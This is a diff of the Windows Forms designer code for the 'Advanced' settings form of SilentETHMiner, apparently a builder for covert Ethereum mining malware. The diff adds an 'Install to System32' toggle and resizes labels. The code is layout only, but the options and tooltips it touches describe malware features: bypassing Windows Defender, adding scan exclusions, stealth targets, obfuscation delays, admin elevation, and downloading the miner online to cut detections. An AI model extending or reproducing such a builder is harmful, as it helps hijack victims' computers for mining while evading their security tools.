@@ -33,7 +33,11 @@ Partial Class Advanced
         Me.Label9 = New System.Windows.Forms.Label()
         Me.Label12 = New System.Windows.Forms.Label()
         Me.Label7 = New System.Windows.Forms.Label()
+        Me.Label13 = New System.Windows.Forms.Label()
         Me.MephTheme1 = New SilentETHMiner.MephTheme()
+        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
+        Me.Label14 = New System.Windows.Forms.Label()
+        Me.toggleInstallSystem32 = New SilentETHMiner.MephToggleSwitch()
         Me.toggleDownloader = New SilentETHMiner.MephToggleSwitch()
         Me.Label8 = New System.Windows.Forms.Label()
         Me.Label11 = New System.Windows.Forms.Label()
@@ -54,6 +58,7 @@ Partial Class Advanced
         Me.chkRemoteConfig = New SilentETHMiner.MephCheckBox()
         Me.txtRemoteConfig = New SilentETHMiner.MephTextBox()
         Me.MephTheme1.SuspendLayout()
+        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.SuspendLayout()
         '
@@ -75,7 +80,7 @@ Partial Class Advanced
         Me.Label26.ForeColor = System.Drawing.Color.Teal
         Me.Label26.Location = New System.Drawing.Point(59, 280)
         Me.Label26.Name = "Label26"
-        Me.Label26.Size = New System.Drawing.Size(18, 20)
+        Me.Label26.Size = New System.Drawing.Size(13, 13)
         Me.Label26.TabIndex = 60
         Me.Label26.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label26, "Will enable DEBUG mode which will display errors when they occur in the miner. !W" &
@@ -90,7 +95,7 @@ Partial Class Advanced
         Me.Label19.ForeColor = System.Drawing.Color.Teal
         Me.Label19.Location = New System.Drawing.Point(379, 236)
         Me.Label19.Name = "Label19"
-        Me.Label19.Size = New System.Drawing.Size(18, 20)
+        Me.Label19.Size = New System.Drawing.Size(13, 13)
         Me.Label19.TabIndex = 66
         Me.Label19.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label19, "The parameters to mine with. ONLY CHANGE THESE IF YOU KNOW WHAT YOU ARE DOING.")
@@ -104,7 +109,7 @@ Partial Class Advanced
         Me.Label1.ForeColor = System.Drawing.Color.Teal
         Me.Label1.Location = New System.Drawing.Point(146, 78)
         Me.Label1.Name = "Label1"
-        Me.Label1.Size = New System.Drawing.Size(18, 20)
+        Me.Label1.Size = New System.Drawing.Size(13, 13)
         Me.Label1.TabIndex = 70
         Me.Label1.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label1, resources.GetString("Label1.ToolTip"))
@@ -118,7 +123,7 @@ Partial Class Advanced
         Me.Label3.ForeColor = System.Drawing.Color.Teal
         Me.Label3.Location = New System.Drawing.Point(173, 171)
         Me.Label3.Name = "Label3"
-        Me.Label3.Size = New System.Drawing.Size(18, 20)
+        Me.Label3.Size = New System.Drawing.Size(13, 13)
         Me.Label3.TabIndex = 73
         Me.Label3.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label3, "Will run commands to exclude the general folders that the miner uses or can use. " &
@@ -134,7 +139,7 @@ Partial Class Advanced
         Me.Label6.ForeColor = System.Drawing.Color.Teal
         Me.Label6.Location = New System.Drawing.Point(378, 163)
         Me.Label6.Name = "Label6"
-        Me.Label6.Size = New System.Drawing.Size(18, 20)
+        Me.Label6.Size = New System.Drawing.Size(13, 13)
         Me.Label6.TabIndex = 76
         Me.Label6.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label6, resources.GetString("Label6.ToolTip"))
@@ -148,7 +153,7 @@ Partial Class Advanced
         Me.Label9.ForeColor = System.Drawing.Color.Teal
         Me.Label9.Location = New System.Drawing.Point(140, 140)
         Me.Label9.Name = "Label9"
-        Me.Label9.Size = New System.Drawing.Size(18, 20)
+        Me.Label9.Size = New System.Drawing.Size(13, 13)
         Me.Label9.TabIndex = 84
         Me.Label9.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label9, "Will make the miner ask for administrator privileges to run." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This is required fo" &
@@ -163,7 +168,7 @@ Partial Class Advanced
         Me.Label12.ForeColor = System.Drawing.Color.Teal
         Me.Label12.Location = New System.Drawing.Point(383, 76)
         Me.Label12.Name = "Label12"
-        Me.Label12.Size = New System.Drawing.Size(18, 20)
+        Me.Label12.Size = New System.Drawing.Size(13, 13)
         Me.Label12.TabIndex = 87
         Me.Label12.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label12, resources.GetString("Label12.ToolTip"))
@@ -177,18 +182,36 @@ Partial Class Advanced
         Me.Label7.ForeColor = System.Drawing.Color.Teal
         Me.Label7.Location = New System.Drawing.Point(120, 109)
         Me.Label7.Name = "Label7"
-        Me.Label7.Size = New System.Drawing.Size(18, 20)
+        Me.Label7.Size = New System.Drawing.Size(13, 13)
         Me.Label7.TabIndex = 89
         Me.Label7.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label7, "Enable this to download the miner from online (GitHub) instead of embedding it in" &
         " the file." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This will greatly decrease the file size and usually greatly decreas" &
         "es detections.")
         '
+        'Label13
+        '
+        Me.Label13.AutoSize = True
+        Me.Label13.BackColor = System.Drawing.Color.Transparent
+        Me.Label13.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label13.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label13.ForeColor = System.Drawing.Color.Teal
+        Me.Label13.Location = New System.Drawing.Point(128, 200)
+        Me.Label13.Name = "Label13"
+        Me.Label13.Size = New System.Drawing.Size(13, 13)
+        Me.Label13.TabIndex = 93
+        Me.Label13.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label13, resources.GetString("Label13.ToolTip"))
+        '
         'MephTheme1
         '
         Me.MephTheme1.AccentColor = System.Drawing.Color.DarkRed
         Me.MephTheme1.Anchor = System.Windows.Forms.AnchorStyles.None
         Me.MephTheme1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
+        Me.MephTheme1.Controls.Add(Me.PictureBox2)
+        Me.MephTheme1.Controls.Add(Me.Label13)
+        Me.MephTheme1.Controls.Add(Me.Label14)
+        Me.MephTheme1.Controls.Add(Me.toggleInstallSystem32)
         Me.MephTheme1.Controls.Add(Me.toggleDownloader)
         Me.MephTheme1.Controls.Add(Me.Label7)
         Me.MephTheme1.Controls.Add(Me.Label8)
@@ -224,6 +247,42 @@ Partial Class Advanced
         Me.MephTheme1.TabIndex = 0
         Me.MephTheme1.Text = "Silent ETH Miner Builder"
         '
+        'PictureBox2
+        '
+        Me.PictureBox2.BackColor = System.Drawing.Color.Transparent
+        Me.PictureBox2.Image = Global.SilentETHMiner.My.Resources.Resources.microsoft_admin
+        Me.PictureBox2.Location = New System.Drawing.Point(244, 196)
+        Me.PictureBox2.Name = "PictureBox2"
+        Me.PictureBox2.Size = New System.Drawing.Size(20, 20)
+        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox2.TabIndex = 94
+        Me.PictureBox2.TabStop = False
+        '
+        'Label14
+        '
+        Me.Label14.AutoSize = True
+        Me.Label14.BackColor = System.Drawing.Color.Transparent
+        Me.Label14.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label14.ForeColor = System.Drawing.Color.Gray
+        Me.Label14.Location = New System.Drawing.Point(12, 197)
+        Me.Label14.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label14.Name = "Label14"
+        Me.Label14.Size = New System.Drawing.Size(119, 17)
+        Me.Label14.TabIndex = 92
+        Me.Label14.Text = "Install to System32:"
+        '
+        'toggleInstallSystem32
+        '
+        Me.toggleInstallSystem32.BackColor = System.Drawing.Color.Transparent
+        Me.toggleInstallSystem32.Checked = False
+        Me.toggleInstallSystem32.ForeColor = System.Drawing.Color.Black
+        Me.toggleInstallSystem32.Location = New System.Drawing.Point(191, 194)
+        Me.toggleInstallSystem32.Margin = New System.Windows.Forms.Padding(2)
+        Me.toggleInstallSystem32.Name = "toggleInstallSystem32"
+        Me.toggleInstallSystem32.Size = New System.Drawing.Size(50, 24)
+        Me.toggleInstallSystem32.TabIndex = 91
+        Me.toggleInstallSystem32.Text = "Install System32"
+        '
         'toggleDownloader
         '
         Me.toggleDownloader.BackColor = System.Drawing.Color.Transparent
@@ -245,7 +304,7 @@ Partial Class Advanced
         Me.Label8.Location = New System.Drawing.Point(12, 106)
         Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label8.Name = "Label8"
-        Me.Label8.Size = New System.Drawing.Size(163, 25)
+        Me.Label8.Size = New System.Drawing.Size(111, 17)
         Me.Label8.TabIndex = 88
         Me.Label8.Text = "Online Download:"
         '
@@ -257,7 +316,7 @@ Partial Class Advanced
         Me.Label11.Location = New System.Drawing.Point(290, 73)
         Me.Label11.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label11.Name = "Label11"
-        Me.Label11.Size = New System.Drawing.Size(138, 25)
+        Me.Label11.Size = New System.Drawing.Size(97, 17)
         Me.Label11.TabIndex = 86
         Me.Label11.Text = "Stealth Targets:"
         '
@@ -286,7 +345,7 @@ Partial Class Advanced
         Me.Label10.Location = New System.Drawing.Point(11, 137)
         Me.Label10.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label10.Name = "Label10"
-        Me.Label10.Size = New System.Drawing.Size(192, 25)
+        Me.Label10.Size = New System.Drawing.Size(133, 17)
         Me.Label10.TabIndex = 83
         Me.Label10.Text = "Run as Administrator:"
         '
@@ -306,7 +365,7 @@ Partial Class Advanced
         '
         Me.PictureBox1.BackColor = System.Drawing.Color.Transparent
         Me.PictureBox1.Image = Global.SilentETHMiner.My.Resources.Resources.microsoft_admin
-        Me.PictureBox1.Location = New System.Drawing.Point(243, 170)
+        Me.PictureBox1.Location = New System.Drawing.Point(243, 167)
         Me.PictureBox1.Name = "PictureBox1"
         Me.PictureBox1.Size = New System.Drawing.Size(20, 20)
         Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
@@ -322,7 +381,7 @@ Partial Class Advanced
         Me.Label27.Location = New System.Drawing.Point(11, 278)
         Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label27.Name = "Label27"
-        Me.Label27.Size = New System.Drawing.Size(76, 25)
+        Me.Label27.Size = New System.Drawing.Size(52, 17)
         Me.Label27.TabIndex = 59
         Me.Label27.Text = "DEBUG:"
         '
@@ -346,7 +405,7 @@ Partial Class Advanced
         Me.Label20.Location = New System.Drawing.Point(291, 257)
         Me.Label20.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label20.Name = "Label20"
-        Me.Label20.Size = New System.Drawing.Size(198, 25)
+        Me.Label20.Size = New System.Drawing.Size(138, 17)
         Me.Label20.TabIndex = 67
         Me.Label20.Text = "Advanced Parameters:"
         '
@@ -389,7 +448,7 @@ Partial Class Advanced
         Me.Label2.Location = New System.Drawing.Point(10, 75)
         Me.Label2.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label2.Name = "Label2"
-        Me.Label2.Size = New System.Drawing.Size(201, 25)
+        Me.Label2.Size = New System.Drawing.Size(140, 17)
         Me.Label2.TabIndex = 69
         Me.Label2.Text = "Pause for Obfuscation:"
         '
@@ -414,7 +473,7 @@ Partial Class Advanced
         Me.Label4.Location = New System.Drawing.Point(11, 168)
         Me.Label4.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label4.Name = "Label4"
-        Me.Label4.Size = New System.Drawing.Size(239, 25)
+        Me.Label4.Size = New System.Drawing.Size(166, 17)
         Me.Label4.TabIndex = 72
         Me.Label4.Text = "Bypass Windows Defender:"
         '
@@ -438,7 +497,7 @@ Partial Class Advanced
         Me.Label5.Location = New System.Drawing.Point(290, 184)
         Me.Label5.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label5.Name = "Label5"
-        Me.Label5.Size = New System.Drawing.Size(201, 25)
+        Me.Label5.Size = New System.Drawing.Size(139, 17)
         Me.Label5.TabIndex = 77
         Me.Label5.Text = "Remote Configuration:"
         '
@@ -491,6 +550,7 @@ Partial Class Advanced
         Me.TransparencyKey = System.Drawing.Color.Fuchsia
         Me.MephTheme1.ResumeLayout(False)
         Me.MephTheme1.PerformLayout()
+        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
         Me.ResumeLayout(False)
 
@@ -525,4 +585,8 @@ Partial Class Advanced
     Friend WithEvents toggleDownloader As MephToggleSwitch
     Friend WithEvents Label7 As Label
     Friend WithEvents Label8 As Label
+    Friend WithEvents PictureBox2 As PictureBox
+    Friend WithEvents Label13 As Label
+    Friend WithEvents Label14 As Label
+    Friend WithEvents toggleInstallSystem32 As MephToggleSwitch
 End Class
